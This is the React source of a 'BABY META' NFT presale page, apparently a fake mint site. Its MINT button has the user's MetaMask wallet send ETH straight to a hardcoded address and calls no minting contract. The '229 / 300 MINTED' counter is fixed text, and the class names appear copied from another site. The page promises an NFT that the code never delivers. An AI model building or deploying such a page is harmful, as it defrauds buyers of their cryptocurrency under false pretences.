import { ethers } from 'ethers';
import { useState } from 'react';
import './App.css';

var value = 1;
let price = 0.12;
var address = '0x2c58d17dCd3144EB22545292Eca96695225B93fb';

function incrementValue() {
    value++;
    document.getElementById('amount').value = value;
    price = price + 0.12;
    price = +price.toFixed(2)

    if(value >= 10) {
        document.getElementById('amount').value = 10;
        value = 10;
        price = 1.2;
    }
    document.getElementById("price").innerHTML=price;
}

function decrementValue() {
    if(value >= 1) {
        value--;
        document.getElementById('amount').value = value;
        price = price - 0.12;
        price = +price.toFixed(2)
    }

    var x = 0;

    if(document.getElementById('amount').value == x) {
        value = 1;
        price = 0.12;
        document.getElementById('amount').value = value;
    }
    document.getElementById("price").innerHTML=price;
} 

const startPayment = async({ setError, setTxs, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No MetaMask found. Please install it.");
        
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const account = accounts[0];

    window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: account,
          to: addr,
          value: "0x" + Number(ethers.utils.parseEther(price.toString())).toString(16)
        },
      ],
    })
  } catch (err) {
    setError(err.message);
  }
}

function App() {
  const [error, setError] = useState();
  const [txs, setTxs] = useState([]);

  const handleClick = async (e) => {
    e.preventDefault();
    setError();
    await startPayment({
      setError,
      setTxs,
      ether: price,
      addr: address
    })
  }

  return (
    <div>
      <div className="header inline-block">
        <img src={"img/logo.png"} className='logo' />
        <div className="title">
          BABY META
        </div>
        <div className="socials">
            <a className="mr" target="_blank" href="https://discord.gg/EHTpTBqGzP">
                <img src={"img/discord.svg"} />
            </a>
            <a className="mr" target="_blank" href="https://twitter.com/BabyMeta_NFT">
                <img src={"img/twitter.svg"} />
            </a>
            <a target="_blank" href="https://www.instagram.com/babymeta_nft/">
                <img src={"img/instagram.svg"} />
            </a>
        </div>
      </div>
      <div className="mint-wrap">
        <div className="xkznxnwsq">
          <img src="img/nft.png" className="xz" alt="h" />
        </div>
        <div className="boonjie-hero-right">
          <div className="g">PRESALE IS LIVE</div>
          <h2 className="uy">MINT YOUR NFT NOW</h2>
          <div className="sc-cBNeex dWtYLN">
            <div className="sc-dmlqKv hYaqUq">10 MAX PER WALLET</div>
          </div>
          <div className="sc-cBNeex dWtYLN">
            <div className="sc-hBEYId ittOSK">
              <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAA2CAYAAABJN/BMAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAASiSURBVHgBvVjNTttMFL1OsmDBIt8WIX3he4JUYoFQFk5f4CtPUFKxYNdEggWrOFtASvMEtE9QumSFVSUICVDDCgmQGiQEC34UEAIEIem5lp06jseesWmPZNkej2eOzz135iZEMTE/P79GMZGkGFheXp49Pz83UqnUzdnZ2TZFRIIiolqtZjRNK9u35Ww2m6aIiEyi0+kYIJGxb9NQo0wREYmErcJ7T3NxcnJSpwiIRAIqbAoeRVJDmQSb0RUGL3SoUaQ/ScJjRhGUTapEwmNGEZRNKk1CYEYRlEwqTSLAjCJIqyFFIsSMIkibNJSEpBlFkDJpKAlJM4ogZdJAEopmFCHUpIEkIphRhHIkEhHNKEKgSX1JxDSjCEKT+pKIaUYRhCYdIvFKZhTB16RDJGTNeH9/T/v7+7Szs0OXl5f8HkliSI2BGpPNmEgkZikAFxcXtLe3ZxG4vr6mu7s7urm5odvbW4sIJKdkMrB0zYyNjQ3UpJpzwWFgFURe4MkPDg6ssxtXV1cWGTdGRkZodHTUOgRoY66JZrPZ5puU0+pnxufnZwJjOj4+pna7TbJ4fHy0Dn4nnU77kXFMWuIbSwlW4eXl5ad7cp746OjIug6CnxJecIiYDCvE1y7kd3d3TavFDoPS5Cpgr7B5mQATYUI2GVbD1NiM+Jq1k5MT4kMVMkr4gUNkkyklkQ3Vw8PDDDs8Ch4eHqxDFU9PT1ZGwTuPiY2NjXyv1yugvUV/EZiTnV46PT2dsRIaF83x8fFvuPwH3siqDBZFCRCoIRFmEEZT13VKIDOsTWV7e7uFYxYdJkCkSX8GJkz6Bj4qtn/nfDqBLHi3urraX0qZzNbW1pvXDBHGauGYQYbkMbf1gVAgnctNl7vd5/+tdQIkvqJTFgoYCwsLX5yXuSN8Uwza1iWyo4Kv/+T6csrlcrqmdde6Xc1sNBoFZ7FKo+MPXjFB5jPSplIqlVrOS1NTU7yzVnH5ToEES1/A3APjpFJJ/lNF7/XoJ3zxlpXv7x0rKytgp7l3UFal4h4Vg8zaqmREJFh69ClAetNpY0U7naePWKC5urILGy1fr9etPpp7EoTlE04fPQMOhMgmYzghckhwyqGtJpK+19Myv0fQKiBg9O/cg7vDQoNYx/Zc8oYIJwME3nOqBUnvHojDAB/8527TPJNxTZHFKsph8asHDZCpgUz/S1E3ZrEl91PaJb3h8z72kZcJ9kEgCQb8UbSNOARRiBjT09Moiqz3BL+6BsMQSIIBf7Aauug5yDSRRTMcIkyetScX9gc26/XGW78Hwt8dWMR4sRJWMry8cw0yNze3CQI/gglTC2H4IHouJLG0tNTCqUCh6OlhPVByGl4fSJFgIO7rONUoFrTa9++NL0E9Qn+VIxsMNiNFAIcBvjHC+oWSsNNRIizDgGfypmmGVshS/9QsLi6aUKNCStAqQT5QJmETMXAyZfpyGPzWg9gkGGFpa6PNYSAFKJHgtA0LSyJBRdkwRCLBQFh4p133e4YwfA5Lx1chwUDaFrxpyz5AGBTNG4OEX9pyIaMahlgkGJy21F9Nrd3RpIhIUQzwaopi5l+VdPTDL8JetlwsE1mmAAAAAElFTkSuQmCC" className="sc-fodVek kvxoVx" />
              <div className="sc-kfzBvY MTNXE">
                <span id="price">0.12</span>ETH
              </div>
            </div>
            <div className="tgwefdin3">
              <div className="sc-dIUeWJ XurKV">
                <button className="sc-idOiZg hzidxS minuson" onClick={decrementValue}>
                <img className='minus' src="img/minus.png" />
                </button>
                <input className=" eth_input sc-bkzYnD bewwCK" id="amount" name="eth" type="number" min="1" max="10" pattern="[A-z0-9]{2,50}" minLength="2" maxLength="50" required="" value="1" disabled="disabled" />
                <button className="sc-idOiZg hzidxS pluson" onClick={incrementValue}>
                  <img className='plus' src="img/plus.png" />
                </button>
              </div>
            </div>
          </div>
          <div className="sc-cBNeex dWtYLN">
            <div className="sc-kEjbQP bIQika"></div>
            <div className="sc-hiSbEG aFkCK">
              <span id="mintnumber">229</span> / 300 MINTED
            </div>
            <div className="sc-jJEKmz mhjY">
              <div className="container_metamask_content-btn">
                <a onClick={handleClick} className="metamask_content-btn text-block-btn discord_m w-button mint_btn nav-link btn btn-sm btn-outline menu-link send-eth">
                  <span>MINT</span>
                </a>
              </div>
              <span id="checkMeta" className="isMeta">{error}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
